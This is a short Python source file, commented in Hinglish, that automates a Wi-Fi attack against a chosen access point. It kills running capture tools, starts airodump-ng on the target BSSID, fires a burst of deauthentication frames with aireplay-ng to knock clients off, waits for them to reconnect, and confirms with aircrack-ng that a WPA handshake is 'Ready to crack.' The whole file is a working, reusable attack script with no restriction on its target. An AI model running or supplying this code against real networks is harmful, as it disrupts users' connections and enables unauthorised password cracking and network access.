import subprocess
import os
import time

def launch_attack(bssid, channel, interface='wlan0mon'):
    try:
        clean_channel = str(channel).split(',')[0]
        
        # 1. Background processes kill karo
        subprocess.run(['pkill', 'airodump-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['pkill', 'aireplay-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        capture_file = "/tmp/awb_attack"
        
        # Purani files delete karo
        for ext in ["-01.cap", "-01.csv", "-01.kismet.csv", "-01.netxml"]:
            if os.path.exists(capture_file + ext):
                try:
                    os.remove(capture_file + ext)
                except:
                    pass
            
        # 2. airodump-ng ko 60 seconds ke liye start karo
        err_log = open("/tmp/awb_err.log", "w")
        airodump = subprocess.Popen(['airodump-ng', '-c', clean_channel, '--bssid', bssid, '-w', capture_file, '--ignore-negative-one', interface], 
                                    stdout=subprocess.DEVNULL, stderr=err_log)
        
        time.sleep(5) # airodump ko channel set hone do
        
        # Agar airodump mar jaye toh error read karo
        if airodump.poll() is not None:
            err_log.close()
            with open("/tmp/awb_err.log", "r") as f:
                error_text = f.read()
            return {"status": "error", "message": f"airodump-ng failed to start. Reason: {error_text}"}
        
        # 3. Burst Deauth Attack (-0 15). Ye sirf 1 second chalega aur phone disconnect karega
        subprocess.run(['aireplay-ng', '-0', '15', '-a', bssid, '--ignore-negative-one', interface], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Ab 55 seconds tak wait karenge. Tumhara phone is beech connect hoga aur handshake mil jayega.
        time.sleep(55)
        
        # Process band karo
        airodump.terminate()
        airodump.wait()
        err_log.close()
        time.sleep(3)
        
        cap_file_path = capture_file + "-01.cap"
        if not os.path.exists(cap_file_path):
            # Agar file phir bhi na bane toh error log read karo
            with open("/tmp/awb_err.log", "r") as f:
                error_text = f.read()
            return {"status": "error", "message": f"Capture file not generated. airodump error: {error_text}"}
        
        # 4. Handshake Verify Karna
        verify = subprocess.run(['aircrack-ng', cap_file_path], capture_output=True, text=True)
        output = verify.stdout
        
        if "1 handshake" in output:
            return {"status": "success", "message": "VERIFIED! Handshake captured successfully! Ready to crack."}
        else:
            return {"status": "error", "message": "Attack finished but NO HANDSHAKE captured. Try again."}
            
    except Exception as e:
        return {"status": "error", "message": str(e)}